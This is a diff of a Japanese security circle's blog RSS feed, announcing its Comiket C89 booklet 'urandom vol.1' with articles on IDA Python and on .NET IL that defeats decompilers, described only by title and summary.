+      <description>いよいよ明日がコミケ初日ですよ！
+むっちゃドキドキしてきた…。
+コミケ戦士の皆さん、今日くらいは自慰は休んで明日に備えますよね？
+というわけでこんにちは、maythです。opが記事説明上げてたので、コミケ初日の今日に至って私もなんか書いておこうかと思います。
+今回は デコンパイラを殺すIL という記事を書いています。殺すといってもSEGVさせるとかではなく、デコンパイルを失敗させるというお話です。
+元々は『SECCON 2015 x CEDEC CHALLENGE ゲームクラッキング＆チートチャレンジ』の発表で触れた内容です（発表資料はSECCON 2015の当該記事にあります）。当日は時間が限られており、チート対策としてのデコンパイル妨害については簡単なサンプルを示すだけにとどめました。その辺りを突っ込んで書いています。
+デコンパイル妨害の指南書というよりかは、調査報告といった感じになっています。実際、本記事の流れはtkbctf2のSkill Analyzerを作るにあたって調査した分に、横浜大会で資料を作る際に再調査した分を付け加えつつ、当時の私の思考と実験をトレースしたような構成としました。
+.NET周りのエンジニアの方にチラッと読んでもらいたい感じの記事です。最近はUnityでMonoを使う機会も増えているかと思います。
+3日目（31日 木曜日）、スペースは 東ホ-05b &amp;ldquo;urandom&amp;rdquo; 、頒布価格は500円です。
+それでは、当日スペースにてお待ちしております。
+note: なお、記事に関するツッコミ等は適宜ブログ記事上げてもらうなり、@maytheplicまでTwitterでリプを飛ばすなりしていただければ。</description>
+    </item>
+    
+    <item>
+      <title>C89情報 - 予告編</title>
+      <link>//blog.urandom.team/post/c89-pre/</link>
+      <pubDate>Wed, 16 Dec 2015 00:41:36 +0900</pubDate>
+      
+      <guid>//blog.urandom.team/post/c89-pre/</guid>
+      <description>maythです。無事に（？）本が出来つつあります（出来たとは言っていない）。世間ではスターのウォーズのなんかの公開が間近に迫っていますが、我々に迫っているのは締め切りとクソコードです。
+&amp;ldquo;urandom vol.1&amp;rdquo;は記事3本でお送りします。記事の著者から内容について簡単なひとことを要求したところ1名ドロップしました。とりあえずこんな内容になります。
+ Easy Recipes for IDA Python (by op)  IDA Pythonの為の簡単なレシピを解説します。  デコンパイラを殺すIL (by mayth)  .NETアプリのデコンパイルを失敗させるべく、我々調査隊はILの奥地へと飛んだ。  秘密計算入門 (by yyu)  (2015-12-25 追記)
+すっかり告知を忘れていましたが入稿を完了しています。 こんな感じの表紙です。 見事に華がないですね。 当日はスペースに何か目印っぽいものを張っておこうと思ったのですが未だ未完成です。 とりあえずスペース番号がわかりやすい何かを置いておきます、たぶん。
+改めて参加日とスペースの告知ですが、3日目（木曜日） 東ホ-05b です。 執筆者でさえ忘れていてWebカタログの地図で自分のサークルを見失いました。
 
-&lt;p&gt;むっちゃドキドキしてきた…。&lt;/p&gt;
-
-&lt;p&gt;コミケ戦士の皆さん、今日くらいは自慰は休んで明日に備えますよね？&lt;/p&gt;
-
-&lt;p&gt;というわけでこんにちは、maythです。opが記事説明上げてたので、コミケ初日の今日に至って私もなんか書いておこうかと思います。&lt;/p&gt;
-
-&lt;p&gt;今回は &lt;strong&gt;デコンパイラを殺すIL&lt;/strong&gt; という記事を書いています。殺すといってもSEGVさせるとかではなく、デコンパイルを失敗させるというお話です。&lt;/p&gt;
-
-&lt;p&gt;元々は『&lt;a href=&#34;http://cedec.cesa.or.jp/2015/session/ENG/10405.html&#34;&gt;SECCON 2015 x CEDEC CHALLENGE ゲームクラッキング＆チートチャレンジ&lt;/a&gt;』の発表で触れた内容です（発表資料は&lt;a href=&#34;http://2015.seccon.jp/cedec-challenge-2015.html&#34;&gt;SECCON 2015の当該記事&lt;/a&gt;にあります）。当日は時間が限られており、チート対策としてのデコンパイル妨害については簡単なサンプルを示すだけにとどめました。その辺りを突っ込んで書いています。&lt;/p&gt;
-
-&lt;p&gt;デコンパイル妨害の指南書というよりかは、調査報告といった感じになっています。実際、本記事の流れはtkbctf2のSkill Analyzerを作るにあたって調査した分に、横浜大会で資料を作る際に再調査した分を付け加えつつ、当時の私の思考と実験をトレースしたような構成としました。&lt;/p&gt;
-
-&lt;p&gt;.NET周りのエンジニアの方にチラッと読んでもらいたい感じの記事です。最近はUnityでMonoを使う機会も増えているかと思います。&lt;/p&gt;
-
-&lt;p&gt;3日目（31日 木曜日）、スペースは &lt;strong&gt;東ホ-05b &amp;ldquo;urandom&amp;rdquo;&lt;/strong&gt; 、頒布価格は500円です。&lt;/p&gt;
-
-&lt;p&gt;それでは、当日スペースにてお待ちしております。&lt;/p&gt;
-
-&lt;p&gt;note: なお、記事に関するツッコミ等は適宜ブログ記事上げてもらうなり、&lt;a href=&#34;https://twitter.com/maytheplic&#34;&gt;@maytheplic&lt;/a&gt;までTwitterでリプを飛ばすなりしていただければ。&lt;/p&gt;
-</description>
+なお、頒布価格は500円を予定しています。消費税はありませんので、本当に500円だけ握りしめて来て頂ければと思います。
+当日誰が売り子やるのかもさっぱり定まっていませんが、スペースでお待ちしております。それでは。
+(2015-12-27 追記)
+この同人誌は2016年2月以降に電子書籍化する予定（詳細未定）です。物理本の購入者には電子書籍版を無料で提供します。</description>
+    </item>
+    
+    <item>
+      <title>C89情報</title>
+      <link>//blog.urandom.team/post/c89/</link>
+      <pubDate>Wed, 04 Nov 2015 05:21:39 +0900</pubDate>
+      
+      <guid>//blog.urandom.team/post/c89/</guid>
+      <description>C89当選しました。スペースは 3日目 東ホ-05b です。
+以前の告知通りの本が出ます。
+ 一歩差がつくIDAコーデ (by op) デコンパイラを殺すIL (by mayth) 他、予定は未定  未だ目次が決まらないあたりに危機感を覚えつつ鋭意執筆中です。
+詳細が決まり次第こちらの記事をアップデートします。Twitterではだいたい私が告知しますが、普段のノイズが多いのでいい感じにウォッチしてください。
+ちょっと気が早いですが当日皆さんにお会いできるのを楽しみにしています。それでは。</description>
+    </item>
+    
+    <item>
+      <title>C89申し込みました</title>
+      <link>//blog.urandom.team/post/c89-appl/</link>
+      <pubDate>Sat, 29 Aug 2015 01:16:53 +0900</pubDate>
+      
+      <guid>//blog.urandom.team/post/c89-appl/</guid>
+      <description>C89に&amp;rdquo;urandom&amp;rdquo;で申し込んでいます。
+『コンピュータセキュリティ総合誌』と称したよろず本、&amp;rdquo;urandom vol.1&amp;rdquo;を頒布予定です。サークルカットにある通り、現時点ではこんな内容です。
+ デコンパイラを殺すIL 一歩差がつくIDAコーデ  デコンパイラを殺すILはSECCON 2015 x CEDEC CHALLENGE ゲームクラッキング＆チートチャレンジの発表で触れられていた内容です。
+落ちたら落ちたでそのとき考えます。</description>
     </item>
     
   </channel>
